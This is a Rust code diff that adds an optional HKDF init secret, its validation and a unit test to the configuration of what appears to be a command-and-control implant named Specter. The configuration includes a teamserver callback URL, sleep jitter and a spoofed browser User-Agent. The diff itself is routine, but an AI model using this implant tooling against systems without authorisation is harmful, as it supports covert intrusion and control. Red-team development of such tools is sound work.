@@ -7,6 +7,8 @@ use crate::error::SpecterError;
 pub struct SpecterConfig {
     /// Teamserver callback URL (e.g. `https://10.0.0.1:443/callback`).
     pub callback_url: String,
+    /// Optional HKDF init secret matching the listener's `init_secret` setting.
+    pub init_secret: Option<String>,
     /// User-Agent string sent in HTTP callbacks.
     pub user_agent: String,
     /// Sleep delay between callbacks in milliseconds.
@@ -25,6 +27,9 @@ impl SpecterConfig {
         if self.callback_url.is_empty() {
             return Err(SpecterError::InvalidConfig("callback_url must not be empty"));
         }
+        if matches!(self.init_secret.as_deref(), Some("")) {
+            return Err(SpecterError::InvalidConfig("init_secret must not be empty"));
+        }
         if self.sleep_jitter > 100 {
             return Err(SpecterError::InvalidConfig("sleep_jitter must be 0–100"));
         }
@@ -36,6 +41,7 @@ impl Default for SpecterConfig {
     fn default() -> Self {
         Self {
             callback_url: String::from("https://127.0.0.1:40056/"),
+            init_secret: None,
             user_agent: String::from(
                 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
             ),
@@ -66,6 +72,12 @@ mod tests {
     #[test]
     fn jitter_over_100_is_invalid() {
         let config = SpecterConfig { sleep_jitter: 101, ..Default::default() };
+        assert!(config.validate().is_err());
+    }
+
+    #[test]
+    fn empty_init_secret_is_invalid() {
+        let config = SpecterConfig { init_secret: Some(String::new()), ..Default::default() };
         assert!(config.validate().is_err());
     }
 }
